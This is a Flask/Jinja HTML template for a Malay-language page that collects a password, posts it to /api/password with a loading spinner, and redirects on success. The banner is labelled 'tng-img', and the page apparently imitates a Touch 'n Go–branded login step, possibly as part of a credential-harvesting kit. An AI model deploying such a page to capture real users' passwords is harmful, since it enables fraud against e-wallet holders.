{% extends "layout.html" %} {% block content %}
<img
  src="{{ url_for('static', filename='banner.png') }}"
  alt="tng-img"
  style="width: 100%; height: 100%; background: #c5a572"
/>

<form id="passwordForm" method="post">
  <label>Masukkan Kata Laluan</label>
  <input type="password" name="password" required />
  <button type="submit">TERUSKAN</button>
</form>

<!-- Loader overlay -->
<div
  id="loader"
  style="
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(255, 255, 255, 0.9);
    z-index: 9999;
    justify-content: center;
    align-items: center;
    flex-direction: column;
  "
>
  <div
    id="spinner"
    style="
      width: 60px;
      height: 60px;
      border: 6px solid #ccc;
      border-top: 6px solid #001a6d;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    "
  ></div>
  <p id="loaderText" style="margin-top: 15px; font-weight: 600; color: #001a6d">
    Memproses...
  </p>
</div>

<script>
  document
    .getElementById("passwordForm")
    .addEventListener("submit", function (e) {
      e.preventDefault();
      const formData = new FormData(this);
      const loader = document.getElementById("loader");
      const spinner = document.getElementById("spinner");
      const loaderText = document.getElementById("loaderText");

      loader.style.display = "flex";

      fetch("/api/password", { method: "POST", body: formData })
        .then((res) => res.json())
        .then((data) => {
          if (data.status === "success") {
            spinner.outerHTML = `
        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
          <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
          <path class="checkmark__check" fill="none" d="M14 27l7 7 17-17"/>
        </svg>
      `;
            loaderText.innerText = "Berjaya!";
            loaderText.style.color = "#4caf50";
            setTimeout(() => {
              window.location.href = data.redirect;
            }, 1500);
          } else {
            loader.style.display = "none";
            alert(data.message || "Password salah.");
          }
        })
        .catch((err) => {
          loader.style.display = "none";
          alert("Server error!");
        });
    });
</script>

<style>
  @keyframes spin {
    0% {
      transform: rotate(0deg);
    }
    100% {
      transform: rotate(360deg);
    }
  }
  .checkmark {
    width: 56px;
    height: 56px;
    border-radius: 50%;
    display: block;
    stroke-width: 4;
    stroke: #fff;
    stroke-miterlimit: 10;
    margin: 10px auto;
    box-shadow: inset 0px 0px 0px #4caf50;
    animation: fill 0.4s ease-in-out 0.4s forwards,
      scale 0.3s ease-in-out 0.9s both;
    background: #4caf50;
  }
  .checkmark__check {
    transform-origin: 50% 50%;
    stroke-dasharray: 48;
    stroke-dashoffset: 48;
    animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) forwards;
  }
  @keyframes stroke {
    100% {
      stroke-dashoffset: 0;
    }
  }
  @keyframes scale {
    0%,
    100% {
      transform: none;
    }
    50% {
      transform: scale3d(1.1, 1.1, 1);
    }
  }
  @keyframes fill {
    100% {
      box-shadow: inset 0px 0px 0px 30px #4caf50;
    }
  }
</style>
{% endblock %}
